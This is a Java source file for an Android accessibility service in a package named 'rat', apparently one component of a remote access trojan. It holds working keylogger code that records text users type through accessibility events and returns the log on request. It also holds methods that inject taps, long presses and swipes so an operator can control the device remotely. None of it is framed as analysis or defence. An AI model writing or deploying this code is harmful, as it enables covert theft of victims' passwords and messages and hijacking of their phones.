package com.nexas.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

public class NexasAccessibilityService extends AccessibilityService {
    private static final String TAG = "NexasAccessibility";
    private static NexasAccessibilityService instance;
    private List<String> keyLogs = new ArrayList<>();
    private Handler handler = new Handler(Looper.getMainLooper());
    private int screenWidth = 0;
    private int screenHeight = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        // Dapatkan ukuran layar
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (wm != null) {
            Display display = wm.getDefaultDisplay();
            DisplayMetrics metrics = new DisplayMetrics();
            display.getRealMetrics(metrics);
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Keylogger: tangkap teks dari event TYPE_VIEW_TEXT_CHANGED
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getSource() != null) {
                CharSequence text = event.getText().toString();
                if (text != null && text.length() > 0) {
                    String newText = text.toString();
                    // Hindari duplikasi berlebihan, simpan di memori
                    keyLogs.add(newText);
                    // Batasi panjang log
                    if (keyLogs.size() > 500) keyLogs.remove(0);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    // Static method untuk mendapatkan instance (dipanggil dari NexasService)
    public static NexasAccessibilityService getInstance() {
        return instance;
    }

    // ========== KEYLOGGER ==========
    public String getKeyLogsAndClear() {
        String logs = String.join("\n", keyLogs);
        keyLogs.clear();
        return logs;
    }

    // ========== REMOTE TOUCH (GESTURE) ==========
    // Konversi koordinat persentase (0-100) ke piksel
    private int percentToPixelsX(int percent) {
        return (int) (percent * screenWidth / 100.0);
    }
    private int percentToPixelsY(int percent) {
        return (int) (percent * screenHeight / 100.0);
    }

    // Tap di koordinat (x,y) persentase
    public void performTap(int xPercent, int yPercent) {
        if (screenWidth == 0 || screenHeight == 0) return;
        int x = percentToPixelsX(xPercent);
        int y = percentToPixelsY(yPercent);
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        dispatchGesture(gestureBuilder.build(), null, null);
    }

    // Long press di koordinat (x,y) persentase (durasi 800ms)
    public void performLongPress(int xPercent, int yPercent) {
        if (screenWidth == 0 || screenHeight == 0) return;
        int x = percentToPixelsX(xPercent);
        int y = percentToPixelsY(yPercent);
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 800));
        dispatchGesture(gestureBuilder.build(), null, null);
    }

    // Swipe dari (x1,y1) ke (x2,y2) persentase (durasi 300ms)
    public void performSwipe(int x1Percent, int y1Percent, int x2Percent, int y2Percent) {
        if (screenWidth == 0 || screenHeight == 0) return;
        int x1 = percentToPixelsX(x1Percent);
        int y1 = percentToPixelsY(y1Percent);
        int x2 = percentToPixelsX(x2Percent);
        int y2 = percentToPixelsY(y2Percent);
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));
        dispatchGesture(gestureBuilder.build(), null, null);
    }

    // ========== UTILITY ==========
    public int getScreenWidth() { return screenWidth; }
    public int getScreenHeight() { return screenHeight; }
}